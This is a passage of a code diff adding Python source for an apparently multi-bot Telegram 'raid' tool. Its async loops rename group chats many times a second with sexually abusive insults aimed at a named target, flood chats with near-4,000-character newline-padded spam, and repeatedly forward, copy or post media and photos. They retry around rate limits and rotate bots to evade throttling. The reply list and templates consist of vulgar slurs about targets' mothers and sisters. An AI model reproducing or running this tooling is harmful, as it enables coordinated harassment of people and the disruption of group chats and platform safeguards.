+REPLY_RAHUL_TEXTS = ["ƖƵƵƛƬ ƘƦƠ ƬƲⱮӇƛƦE ƁƛƛƤ ƖƟƧƬ ƘƖ 😑🙌🏾","ƓƛƊƊӇƛ ƊƖƘӇƛ ƘHƠƊ ƊƖƳƛ ƬEƦƖ Ɱƛƛ ƊƖƘӇƖ ƇHƠƊ ƊƖƳƛ 🙊🤦🏾😂","ƖƟƧƬ ƁƊⱮƠƧӇ ƧƤEƛƘƖƝG ƑƦƠⱮ ƬEƦƖ ⱮƘƁ🤦🏾☎️","ƇƲƊƝƛ ⱮƝƛ ӇƛƖ 😩🤟🏻","ƬEƦƖ Ɱƛƛ ƇƠƊ ƘE ⱮƛƦ ƊƲƝƓƛ 🤣🖕🏾","ƬEƦƖ Ɱƛƛ ƇƲƊ ƦӇƖ ӇƛƖ ƝƛƇӇƠ 👻🕺","ӇƳ ƇƠƬƲ 😉✌🏾","ƇƳƛ","ƑƛƧT ʟƖƘӇ","𝙌 ❓🤨","ƇƲƊ ƘE ⱮƦƓƳƛ ƘƳƛ 💀😹","ӇʟƔ ƤƓʟ ƁHƛƓ ⱮƬ 🏃‍♂️💨","ƖƟƧƬ ƇHƠƊ ƦӇƛ ӇƛƖ 👻🔥","ƇƳƛ?","ƬEƦƖ Ɱƛƛ ❓","ƬEƦƖ ƁHEƝ ⱮƛƦƊƲ ❓","ӇEʟƤ ӇEʟƤ ⱮƬ ƘƦ ƇƠƬƲ 😩👍🏾","ƤƲJƛ ƘƦ ƬEƦƛ ƁƛƛƤ ƖƟƧƬ ƘƖ 🙏🏾🔥","ӇʟƔ ӇʟƔ ӇƛƮʟƛ ӇƠƓƳƛ ƬEƦƖ ⱮƘƁ ⱮE 😱😂","ƬEƦƖ ƁƘƇ ⱮE ƁƖƓƁƠƧƧ 📺😆","ӇʟƔ RƤʟƳ ƑƛƧƬ","ƑƛƧƬ ƬƳƤE ƘƦ ƊƛƦ ⱮƬ 😤⌨️","ӇEʟƤ ӇEʟƤ ƬEƦƖ Ɱƛƛ ƇHƲƊ ƓƳƖ 😩","ƖƟƧƬ ƛƁƁƲ ƤEʟ ƦӇE ӇƛƖ 👻💪","ӇƳ ƬEƦƖ Ɱƛƛ ⱮƦ ƓƳƖ ƘƳƛ 😶💔","ƛƔƔ ƬEƦƖ Ɱƛƛ ƘƠ ƤƠƠƘƖE ƁƝƛƘE ⱮƛƦƲƝƓƛ 🤣🎀","ƘƳƛ ❓😑","ƦƠ ⱮƬ 😂🤟🏻","ƧƠƦƬ ƝӇƖ ƘƦƲƝƓƛ ƇƲƊ ƬƲ ƁƖƝƛ ƦƲƘE 😹🖕🏾","ƬƛƘE ƳƠƲƦ ƬƖⱮE ƑƖƦ ƇƲƊ 😉✌🏾","ӇʟƔ ƘƲƬƖƳƛ ƘE ʟƦƘE 🐶😆","ӇʟƔ ӇʟƔ ⱮJƛ ƛƛƦӇƛ ƇƲƊƝE ⱮE 😜🔥","ƖƟƧƬ ƓƝƊ ⱮƛƛƦ ƦӇE ӇƛƖ 👻","ӇƳ ƇƠƬƲ ƁHƛƓ ⱮƬ ƦƝƊƳ ƘE 🔥😑👍🏾","ƁHƛƓƝƛ ⱮƛƝƛ ӇƛƖ JƖ 🚫😎","ƖƟƧƬ ƛƛƓƳE 🤣🩷🙌🏾","ƬEƦƖ Ɱƛƛ ⱮƛƦƘE ⱮJƊƲƦƖ ƘHƬƮ 👍🏾","ƘƳƛ ƖƟƧƬ ƬEƦƛ ƁƛƛƤ ӇƛƖ 👻❓","ƘƳƛ ⱮƬʟƁ ƬEƦƖ Ɱƛƛ ƖƟƧƬ ƝE ƇƠƊƖ 😹🖕🏾","ƬEƦƖ ƁHEƝ ⱮƛƦƘE ƁHƛƓ JƛƲƝƓƛ 🙋🏾🤪","ƬEƦƖ ƁHEƝ ⱮƛƦƘE ƖƟƧƬ ƁHƛƓ ƓƳƛ 🤦🏾💔","ƁHƛƓ 𝙌 ƦӇƛ ӇƛƖ ❓","ƬEƦƖ Ɱƛƛ ⱮƲⱮƁƛƖ ⱮE ƇƲƊEƓƖ 😌🩷🙌🏾","ƬƳƤE ƘƦ Ɲƛ ƛƁ ƬEƦE ƁƛƛƤ ƘE ƧƛⱮƝE ⁉️","ƘƦ ƬƳƤE ƬⱮƘƇ 😂🤟🏻","JʟƊƖ ƇƲƊ 🤢","ƁƖƝƛ ƦƲƘE ƬHƲƘƛƖ ӇƠƓƖ ƬEƦƖ 😁😂","ƁHƛƓEƓƛ ƬƠ ƇƠƊ ƘE ⱮƛƦƊƲƝƓƛ 😑🙌🏾","ƖƊHƦ ƛJƛ ƇHƠƬEƳ 👶🍼","ƁHƛƓ ⱮƬ ƘƲƬƖ ƘE 🙊😂","ƬEƦƖ Ɱƛƛ ƘƠ ƁEƝ10 ⱮE ƇƠƊƲƝƓƛ 👽😱","ƖƵƵƛƬ ƘƦEƓƛ ƛƛJƧE ƖƟƧƬ ƛƁƁƲ ƘƖ 😂🤟🏻","ƬEƦƖ ƁHEƝ ƘƖ ƤƠƠƘƖE ƓƔƊ ⱮE ʟƲƝ 🎀","ƁHƛƓ ⱮƬ ƁEƬE 😑🙌🏾","ƖƊHƦ ƛJƛ ʟƛƊʟE 😉❤️","ƬEƦƖ ⱮƓƊ ⱮE 100 ӇƛƬӇ 💯🔥","ƘƦ ƛƁ ӇƛƔƛƵƖ?","ʟE ƛƛƓƳƛ ƬEƦƛ ƁƛƛƤ ƖƟƧƬ 👻👑","ƁHƛƓƝE ƧE ƘƲƇӇ ƝӇƖ ӇƠƓƛ 🐕❌","ƁHƛƓ ƁHƛƓ ƬⱮƘƇ 😑😹","ƁHƛƓƛ ƁHƛƓƛ ƘE ⱮƛƦƲƝƓƛ 🤣🩷🙌🏾","ƁN ƛƁ ƑƳƬƦ 🤦🏾😎😂","ƘƦ Ɲƛ ƑƳƬ 😁🔥","ƁHƛƓEƓƛ ❓","ƁHƛƓ JʟƊƖ 🐕🏳️‍🌈","ӇʟƔ ƇƲƊƓƳƖ ƘƳƛ 💀😹","ƖƟƧƬ ƛƛƓƳƛ 👻🔥","ƬEƦE ƁƛƛƤ ƖƟƧƬ ƘƖ EƝƬƦƳ 👻😂","ƦEⱮEⱮƁER ƬHE  ƘEƝG ƖƟƧƬ 👻👑"]
+
+
+
+
+
+
+
+dp = Dispatcher()
+
+
+
+
+
+
+
+async def safe_reply(message: types.Message, text: str, **kwargs):
+
+
+
+    try:
+
+
+
+        await message.reply(text, **kwargs)
+
+
+
+    except Exception as e:
+
+
+
+        print(f"{RED}[ERROR] Send Message failed: {e}{RESET}")
+
+
+
+
+
+
+
+async def get_target_info(message: types.Message, command_arg: str = None):
+
+
+
+    uid, name = None, None
+
+
+
+    if message.reply_to_message:
+
+
+
+        rm = message.reply_to_message
+
+
+
+        if rm.forward_from_chat:
+
+
+
+            uid = rm.forward_from_chat.id
+
+
+
+            name = rm.forward_from_chat.title or "Channel"
+
+
+
+        elif rm.sender_chat:
+
+
+
+            uid = rm.sender_chat.id
+
+
+
+            name = rm.sender_chat.title or "Channel"
+
+
+
+        elif rm.from_user:
+
+
+
+            uid = rm.from_user.id
+
+
+
+            name = rm.from_user.first_name
+
+
+
+        else:
+
+
+
+            uid = rm.chat.id
+
+
+
+            name = rm.chat.title or "Chat"
+
+
+
+    elif message.entities:
+
+
+
+        for ent in message.entities:
+
+
+
+            if ent.type == 'text_mention' and ent.user:
+
+
+
+                uid, name = ent.user.id, ent.user.first_name
+
+
+
+                break
+
+
+
+            if ent.type == 'mention' and message.text:
+
+
+
+                uname = message.text[ent.offset + 1: ent.offset + ent.length].lower()
+
+
+
+                if uname in username_to_id:
+
+
+
+                    uid = username_to_id[uname]
+
+
+
+                    name = user_names.get(uid, uname)
+
+
+
+                    break
+
+
+
+    elif command_arg:
+
+
+
+        arg = command_arg.strip()
+
+
+
+        if arg.lstrip('-').isdigit():
+
+
+
+            uid = int(arg)
+
+
+
+            name = user_names.get(uid, "Target")
+
+
+
+        elif arg.startswith('@'):
+
+
+
+            uname = arg[1:].lower()
+
+
+
+            if uname in username_to_id:
+
+
+
+                uid = username_to_id[uname]
+
+
+
+                name = user_names.get(uid, uname)
+
+
+
+                
+
+
+
+    if uid and name:
+
+
+
+        user_names[uid] = name
+
+
+
+        save_db()
+
+
+
+    return uid, name
+
+
+
+
+
+
+
+def get_target_chats(message: types.Message, is_lord_cmd: bool = False):
+
+
+
+    """Determines target chat IDs. Returns all Lord list groups if command starts with !g or !lord."""
+
+
+
+    if is_lord_cmd:
+
+
+
+        return list(lord_groups) if lord_groups else [message.chat.id]
+
+
+
+    return [message.chat.id]
+
+
+
+
+
+
+
+def get_active_groups_info():
+
+
+
+    active_chats = set()
+
+
+
+    for task_dict in [group_tasks, keng_tasks, spmnc_tasks, spm_loop_tasks, rspm_tasks, pfp_tasks, sticker_spm_tasks, gif_spm_tasks, media_spm_tasks, voice_spm_tasks, seq_nc_tasks, forwardspm_tasks, RAHULnc_tasks, RAHULspam_tasks]:
+
+
+
+        for key, val in task_dict.items():
+
+
+
+            if val: active_chats.add(key)
+
+
+
+    for key in swipe_mode:
+
+
+
+        active_chats.add(key)
+
+
+
+    return list(active_chats)
+
+
+
+
+
+
+
+async def generate_tts(text, lang="en"):
+
+
+
+    encoded_text = urllib.parse.quote(text.strip())
+
+
+
+    url = f"https://translate.google.com/translate_tts?ie=UTF-8&q={encoded_text}&tl={lang}&client=tw-ob"
+
+
+
+    headers = {"User-Agent": "Mozilla/5.0"}
+
+
+
+    try:
+
+
+
+        async with aiohttp.ClientSession() as session:
+
+
+
+            async with session.get(url, headers=headers) as response:
+
+
+
+                if response.status == 200:
+
+
+
+                    return await response.read()
+
+
+
+    except Exception:
+
+
+
+        pass
+
+
+
+    return None
+
+
+
+
+
+
+
+def create_sticker_image(text, bg_color="black", font_type="default"):
+
+
+
+    if not HAS_PIL:
+
+
+
+        return None
+
+
+
+    import io
+
+
+
+    
+
+
+
+    colors = {
+
+
+
+        "red": "#FF3B30", "blue": "#007AFF", "green": "#34C759",
+
+
+
+        "yellow": "#FFCC00", "black": "#1C1C1E", "white": "#F2F2F7", "purple": "#AF52DE"
+
+
+
+    }
+
+
+
+    bg_hex = colors.get(bg_color, "#1C1C1E")
+
+
+
+    
+
+
+
+    img = Image.new("RGBA", (512, 512), (0, 0, 0, 0))
+
+
+
+    draw = ImageDraw.Draw(img)
+
+
+
+    
+
+
+
+    bubble_bbox = [20, 100, 492, 412]
+
+
+
+    draw.rounded_rectangle(bubble_bbox, radius=40, fill=bg_hex)
+
+
+
+    
+
+
+
+    font_obj = None
+
+
+
+    font_size = 65 if font_type == "bold" else 55
+
+
+
+    font_paths = [
+
+
+
+        "arial.ttf", "calibri.ttf", "tahoma.ttf", "seguiemj.ttf", 
+
+
+
+        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if font_type == "bold" else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
+
+
+
+        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf" if font_type == "bold" else "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
+
+
+
+        "/System/Library/Fonts/Helvetica.ttc", "/Library/Fonts/Arial.ttf"
+
+
+
+    ]
+
+
+
+    for p in font_paths:
+
+
+
+        try:
+
+
+
+            font_obj = ImageFont.truetype(p, font_size)
+
+
+
+            break
+
+
+
+        except IOError:
+
+
+
+            continue
+
+
+
+            
+
+
+
+    if font_obj is None:
+
+
+
+        font_obj = ImageFont.load_default()
+
+
+
+        
+
+
+
+    text_color = "black" if bg_color in ["white", "yellow"] else "white"
+
+
+
+    
+
+
+
+    wrapped_text = "\n".join(textwrap.wrap(text, width=15))
+
+
+
+    
+
+
+
+    if HAS_PILMOJI:
+
+
+
+        with Pilmoji(img) as pilmoji:
+
+
+
+            pilmoji.text((256, 256), wrapped_text, fill=text_color, font=font_obj, anchor="mm", align="center")
+
+
+
+    else:
+
+
+
+        draw.text((256, 256), wrapped_text, fill=text_color, font=font_obj, anchor="mm", align="center")
+
+
+
+    
+
+
+
+    bio = io.BytesIO()
+
+
+
+    img.save(bio, "WEBP")
+
+
+
+    bio.seek(0)
+
+
+
+    return bio.getvalue()
+
+
+
+
+
+
+
+async def seq_nc_worker(chat_id: int, base_text: str, active_bots: list, task_id: str):
+
+
+
+    bot_idx = 0
+
+
+
+    num_bots = len(active_bots)
+
+
+
+    while seq_nc_tasks.get(chat_id) == task_id:
+
+
+
+        try:
+
+
+
+            current_bot = active_bots[bot_idx]
+
+
+
+            bot_idx = (bot_idx + 1) % num_bots
+
+
+
+            
+
+
+
+            emoji_char = random.choice(SEQ_EMOJIS)
+
+
+
+            base_len = len(list(base_text))
+
+
+
+            emoji_len = len(list(emoji_char))
+
+
+
+            
+
+
+
+            max_repeats = max(1, (125 - base_len - 1) // max(1, emoji_len))
+
+
+
+            frame_to_set = base_text + " " + (emoji_char * max_repeats)
+
+
+
+            
+
+
+
+            await current_bot.set_chat_title(chat_id, frame_to_set[:125])
+
+
+
+            await asyncio.sleep(0.02)
+
+
+
+        except TelegramRetryAfter:
+
+
+
+            bot_idx = (bot_idx + 1) % num_bots
+
+
+
+            await asyncio.sleep(0.01)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(0.1)
+
+
+
+
+
+
+
+async def nc_loop_worker(bot: Bot, chat_id: int, name: str, task_id: str):
+
+
+
+    while group_tasks.get(chat_id, {}).get(bot.id) == task_id:
+
+
+
+        try:
+
+
+
+            delay = nc_delays.get(chat_id, 150) / 1000.0
+
+
+
+            base_text = f"{name} {random.choice(RAID_TEXTS)}"
+
+
+
+            emoji_block = random.choice(emo_EMOJIS)
+
+
+
+            
+
+
+
+            base_len = len(list(base_text))
+
+
+
+            emoji_len = len(list(emoji_block))
+
+
+
+            
+
+
+
+            if base_len < 120:
+
+
+
+                max_repeats = (125 - base_len - 2) // emoji_len
+
+
+
+                frame_to_set = base_text + "  " + (emoji_block * max_repeats)
+
+
+
+            else:
+
+
+
+                frame_to_set = base_text
+
+
+
+                
+
+
+
+            await bot.set_chat_title(chat_id, frame_to_set[:125])
+
+
+
+            await asyncio.sleep(delay)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.1)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1)
+
+
+
+
+
+
+
+async def emo_loop_worker(bot: Bot, chat_id: int, base_text: str, task_id: str):
+
+
+
+    while group_tasks.get(chat_id, {}).get(bot.id) == task_id:
+
+
+
+        try:
+
+
+
+            delay = nc_delays.get(chat_id, 150) / 1000.0
+
+
+
+            emoji_block = random.choice(emo_EMOJIS) + random.choice(emo_EMOJIS)
+
+
+
+            base_len = len(list(base_text))
+
+
+
+            emoji_len = len(list(emoji_block))
+
+
+
+            max_repeats = max(1, (125 - base_len) // emoji_len)
+
+
+
+            dynamic_gap = " " * random.randint(1, 3)
+
+
+
+            
+
+
+
+            frame_to_set = base_text + dynamic_gap + (emoji_block * max_repeats)
+
+
+
+            await bot.set_chat_title(chat_id, frame_to_set[:125])
+
+
+
+            await asyncio.sleep(delay)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.1)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1)
+
+
+
+
+
+
+
+async def keng_loop_worker(bot: Bot, chat_id: int, name: str, task_id: str):
+
+
+
+    while keng_tasks.get(chat_id, {}).get(bot.id) == task_id:
+
+
+
+        try:
+
+
+
+            delay = nc_delays.get(chat_id, 150) / 1000.0
+
+
+
+            template = random.choice(KENG_TEMPLATES)
+
+
+
+            base_text = template["text"].replace("NAME", name)
+
+
+
+            emoji_block = template["emoji"]
+
+
+
+            base_len = len(list(base_text))
+
+
+
+            emoji_len = len(list(emoji_block))
+
+
+
+            max_repeats = max(1, (125 - base_len) // emoji_len)
+
+
+
+            dynamic_gap = " " * random.randint(1, 3)
+
+
+
+            frame_to_set = base_text + dynamic_gap + (emoji_block * max_repeats)
+
+
+
+            await bot.set_chat_title(chat_id, frame_to_set)
+
+
+
+            await asyncio.sleep(delay)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.1)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1)
+
+
+
+
+
+
+
+async def RAHULnc_loop_worker(bot: Bot, chat_id: int, name: str, task_id: str):
+
+
+
+    templates = ["ƘƳƲ ƦЄ NAME ƘƲƬƬЄ [ ƖƟƧƬ ] ƁƛƛƤ ƧЄ ƁƛƊƬƛⱮЄЄƵƖ? ","NAME ƲƬH ƩMƘƇ ","NAME ƝƇ ƝƇ ƘƦЄƓƛ ƦƝƊƖƘ","NAME <div>ƠƦ ⱮƛƖ ƘЄ ƇHƠƊƠ","NAME ƝƊ ƲƝƘЄ ӇƠⱮƖЄƧ ƘƖ Ɱƛ ƦƝƊƖ","NAME ƲƬH ƦƝƊƖƘ ƠҲƳƓЄƝ ԼЄ","ƇHƛԼ ƇHƛԼ NAME ƵƠƦ ԼƛƓƛ ⱮƇ","NAME ⱮƇ","NAME ƁƇ","NAME ƬƛƬƬЄ","NAME ƇHƲƊ"]
+
+
+
+    while RAHULnc_tasks.get(chat_id, {}).get(bot.id) == task_id:
+
+
+
+        try:
+
+
+
+            delay = nc_delays.get(chat_id, 500) / 1000.0
+
+
+
+            base = random.choice(templates).replace("NAME", name)
+
+
+
+            
+
+
+
+            c1 = "✘" if random.random() > 0.5 else "─"
+
+
+
+            c2 = "✘" if random.random() > 0.5 else "─"
+
+
+
+            c3 = "✘" if random.random() > 0.5 else "─"
+
+
+
+            c4 = "✘" if random.random() > 0.5 else "─"
+
+
+
+            c5 = "✘" if random.random() > 0.5 else "─"
+
+
+
+            
+
+
+
+            pattern = f"─────── {c1} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ────────{c2}─────{c3}───────❗────── ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{c4} {c5}"
+
+
+
+            
+
+
+
+            frame = (base + pattern)[:125]
+
+
+
+            
+
+
+
+            await bot.set_chat_title(chat_id, frame)
+
+
+
+            await asyncio.sleep(delay)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.1)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1)
+
+
+
+
+
+
+
+async def spmnc_worker(bot: Bot, chat_id: int, name: str, task_id: str):
+
+
+
+    last_msg_time = 0
+
+
+
+    while spmnc_tasks.get(chat_id, {}).get(bot.id) == task_id:
+
+
+
+        try:
+
+
+
+            delay = nc_delays.get(chat_id, 100) / 1000.0
+
+
+
+            long_raw = random.choice(SPMNC_LONG).replace("NAME", name)
+
+
+
+            small_raw = random.choice(SPMNC_SMALL).replace("NAME", name)
+
+
+
+            random_emoji = random.choice(emo_EMOJIS)
+
+
+
+            title_text = f"{random_emoji} {small_raw} {random_emoji}"
+
+
+
+            try:
+
+
+
+                await bot.set_chat_title(chat_id, title_text)
+
+
+
+            except TelegramRetryAfter as e:
+
+
+
+                await asyncio.sleep(e.retry_after + 0.1)
+
+
+
+                continue
+
+
+
+            except Exception:
+
+
+
+                pass
+
+
+
+            await asyncio.sleep(delay)
+
+
+
+            if time.time() - last_msg_time > 7.0:
+
+
+
+                try:
+
+
+
+                    await bot.send_message(chat_id, long_raw)
+
+
+
+                    last_msg_time = time.time()
+
+
+
+                except Exception:
+
+
+
+                    pass
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1)
+
+
+
+
+
+
+
+async def copy_spm_sender(bot: Bot, chat_id: int, from_chat_id: int, msg_id: int, tasks_dict, task_id: str):
+
+
+
+    """Spams by flawlessly copying any given message entirely server-side."""
+
+
+
+    while task_id in tasks_dict.get(chat_id, []):
+
+
+
+        try:
+
+
+
+            d = spm_delays.get(chat_id, 900) / 1000.0
+
+
+
+            await bot.copy_message(chat_id=chat_id, from_chat_id=from_chat_id, message_id=msg_id)
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.5)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1.5)
+
+
+
+
+
+
+
+async def spm_sender(bot: Bot, chat_id: int, msg_id: int, text: str, tasks_dict, task_id_obj_key, task_id: str):
+
+
+
+    while task_id in tasks_dict.get(task_id_obj_key, []):
+
+
+
+        try:
+
+
+
+            d = spm_delays.get(chat_id, 900) / 1000.0
+
+
+
+            kwargs = {}
+
+
+
+            if msg_id: 
+
+
+
+                kwargs["reply_to_message_id"] = msg_id
+
+
+
+            
+
+
+
+            if LinkPreviewOptions:
+
+
+
+                kwargs["link_preview_options"] = LinkPreviewOptions(is_disabled=True)
+
+
+
+            else:
+
+
+
+                kwargs["disable_web_page_preview"] = True
+
+
+
+                
+
+
+
+            await bot.send_message(chat_id, text, **kwargs)
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.5)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1.5)
+
+
+
+
+
+
+
+async def RAHULspam_sender(bot: Bot, chat_id: int, text: str, tasks_dict, task_id: str):
+
+
+
+    content_len = len(text) * 2
+
+
+
+    if content_len < 4000:
+
+
+
+        newlines_count = 4000 - content_len
+
+
+
+        msg = text + ("\n" * newlines_count) + text
+
+
+
+    else:
+
+
+
+        msg = text[:4000]
+
+
+
+        
+
+
+
+    while task_id in tasks_dict.get(chat_id, []):
+
+
+
+        try:
+
+
+
+            d = spm_delays.get(chat_id, 900) / 1000.0
+
+
+
+            kwargs = {}
+
+
+
+            if LinkPreviewOptions:
+
+
+
+                kwargs["link_preview_options"] = LinkPreviewOptions(is_disabled=True)
+
+
+
+            else:
+
+
+
+                kwargs["disable_web_page_preview"] = True
+
+
+
+                
+
+
+
+            await bot.send_message(chat_id, msg, **kwargs)
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.5)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1.5)
+
+
+
+
+
+
+
+async def media_spm_sender(bot: Bot, chat_id: int, media_type: str, file_id: str, caption, caption_entities, tasks_dict, task_id: str):
+
+
+
+    while task_id in tasks_dict.get(chat_id, []):
+
+
+
+        try:
+
+
+
+            d = spm_delays.get(chat_id, 900) / 1000.0
+
+
+
+            kwargs = {}
+
+
+
+            if caption: kwargs['caption'] = caption
+
+
+
+            if caption_entities: kwargs['caption_entities'] = caption_entities
+
+
+
+            
+
+
+
+            if media_type == "photo": await bot.send_photo(chat_id, file_id, **kwargs)
+
+
+
+            elif media_type == "video": await bot.send_video(chat_id, file_id, **kwargs)
+
+
+
+            elif media_type == "document": await bot.send_document(chat_id, file_id, **kwargs)
+
+
+
+            elif media_type == "audio": await bot.send_audio(chat_id, file_id, **kwargs)
+
+
+
+            elif media_type == "animation": await bot.send_animation(chat_id, file_id, **kwargs)
+
+
+
+            elif media_type == "sticker": await bot.send_sticker(chat_id, file_id)
+
+
+
+            elif media_type == "voice": await bot.send_voice(chat_id, file_id, **kwargs)
+
+
+
+            
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.5)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1.5)
+
+
+
+
+
+
+
+async def rspm_sender(bot: Bot, chat_id: int, name: str, tasks_dict, task_id: str):
+
+
+
+    while task_id in tasks_dict.get(chat_id, []):
+
+
+
+        try:
+
+
+
+            d = rspm_delays.get(chat_id, 900) / 1000.0
+
+
+
+            base = f"{name} {random.choice(RAID_TEXTS)}"
+
+
+
+            emoji = random.choice(emo_EMOJIS)
+
+
+
+            
+
+
+
+            chunk = f"{base} {emoji}\n\n\n\n\n\n\n\n\n\n"
+
+
+
+            msg_text = ""
+
+
+
+            while len(msg_text) + len(chunk) < 4000:
+
+
+
+                msg_text += chunk
+
+
+
+                
+
+
+
+            kwargs = {}
+
+
+
+            if LinkPreviewOptions:
+
+
+
+                kwargs["link_preview_options"] = LinkPreviewOptions(is_disabled=True)
+
+
+
+            else:
+
+
+
+                kwargs["disable_web_page_preview"] = True
+
+
+
+                
+
+
+
+            await bot.send_message(chat_id, msg_text, **kwargs)
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.5)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1.5)
+
+
+
+
+
+
+
+async def forward_spm_sender(bot: Bot, chat_id: int, from_chat_id: int, msg_id: int, tasks_dict, task_id: str):
+
+
+
+    while task_id in tasks_dict.get(chat_id, []):
+
+
+
+        try:
+
+
+
+            d = spm_delays.get(chat_id, 900) / 1000.0
+
+
+
+            await bot.forward_message(chat_id=chat_id, from_chat_id=from_chat_id, message_id=msg_id)
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.5)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(1.5)
+
+
+
+
+
+
+
+async def pfp_loop_worker(bot: Bot, chat_id: int, task_id: str):
+
+
+
+    while task_id in pfp_tasks.get(chat_id, []):
+
+
+
+        try:
+
+
+
+            d = pfp_delays.get(chat_id, 900) / 1000.0
+
+
+
+            folder = os.path.join(os.path.dirname(__file__), 'downloads', str(chat_id))
+
+
+
+            if not os.path.exists(folder):
+
+
+
+                await asyncio.sleep(5)
+
+
+
+                continue
+
+
+
+            files = [f for f in os.listdir(folder) if f.endswith('.jpg')]
+
+
+
+            if not files:
+
+
+
+                await asyncio.sleep(5)
+
+
+
+                continue
+
+
+
+            pic = random.choice(files)
+
+
+
+            pic_path = os.path.join(folder, pic)
+
+
+
+            await bot.set_chat_photo(chat_id, FSInputFile(pic_path))
+
+
+
+            await asyncio.sleep(d)
+
+
+
+        except TelegramRetryAfter as e:
+
+
+
+            await asyncio.sleep(e.retry_after + 0.1)
+
+
+
+        except Exception:
+
+
+
+            await asyncio.sleep(2)
+
+
+
+
+
+
+
+def get_selector_keyboard(task_id: str):
+
+
+
+    menu = active_menus.get(task_id)
+
+
+
+    if not menu: return None
+
+
+
+    sel = menu['selected']
+
+
+
+    keyboard = []
+
+
+
+    row = []
+
+
+
+    
+
+
+
+    max_display = min(len(bot_usernames), 90)
+
+
+
+    for i in range(max_display):
+
+
+
+        uname = bot_usernames[i]
+
+
+
+        check = "✅" if i in sel else "❌"
+
+
+
+        row.append(InlineKeyboardButton(text=f"{check} {uname}", callback_data=f"tk_{task_id}_tgl_{i}"))
+
+
+
+        if len(row) == 2:
+
+
+
+            keyboard.append(row)
+
+
+
+            row = []
+
+
+
+            
+
+
+
+    if row: keyboard.append(row)
+
+
+
+    keyboard.append([
+
+
+
+        InlineKeyboardButton(text=font("🔘 Select All"), callback_data=f"tk_{task_id}_all"),
+
+
+
+        InlineKeyboardButton(text=font("⚪️ None"), callback_data=f"tk_{task_id}_none")
+
+
+
+    ])
+
+
+
+    keyboard.append([InlineKeyboardButton(text=font("🚀 START LAUNCH"), callback_data=f"tk_{task_id}_start")])
+
+
+
+    return InlineKeyboardMarkup(inline_keyboard=keyboard)
+
+
+
+
+
+
+
+async def send_start_menu(message: types.Message, bot: Bot):
+
+
+
+    owner_name = font(user_names.get(OWNER_ID, 'Owner'))
+
+
+
+    owner_acc = f"[{owner_name}](tg://user?id={OWNER_ID})"
+
+
+
+    
+
+
+
+    user_mention = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})" if message.from_user else "Admin"
+
+
+
+    
+
+
+
+    text = font("Hello ") + user_mention + font("!\nI'm an advanced bot created by RAHUL handled by ") + owner_acc + font(".\nHow can I help you?")
+
+
+
+    
+
+
+
+    buttons = [[InlineKeyboardButton(text=font("👤 Owner"), url=f"tg://user?id={OWNER_ID}")],[InlineKeyboardButton(text=font("ℹ️ About"), callback_data="start_about")],[
+
+
+
+            InlineKeyboardButton(text=font("📜 Commands"), callback_data="start_restricted"),
+
+
+
+            InlineKeyboardButton(text=font("⚙️ Settings"), callback_data="start_restricted")
+
+
+
+        ]
+
+
+
+    ]
+
+
+
+    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+
+
+
+
+
+
+
+    try:
+
+
+
+        if os.path.exists(START_PIC_PATH):
+
+
+
+            await message.answer_photo(FSInputFile(START_PIC_PATH), caption=text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        else:
+
+
+
+            await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)
+
+
+
+    except Exception:
+
+
+
+        await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+
+
+
+
+@dp.my_chat_member()
+
+
+
+async def on_my_chat_member(update: ChatMemberUpdated):
+
+
+
+    """Automatically logs the bot into groups and channels dynamically."""
+
+
+
+    if update.new_chat_member.status in ['member', 'administrator', 'restricted']:
+
+
+
+        known_chats.add(update.chat.id)
+
+
+
+        save_db()
+
+
+
+
+
+
+
+@dp.channel_post(Command("startpfp", prefix="/!"))
+
+
+
+@dp.message(Command("startpfp", prefix="/!"))
+
+
+
+async def cmd_startpfp(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return
+
+
+
+    
+
+
+
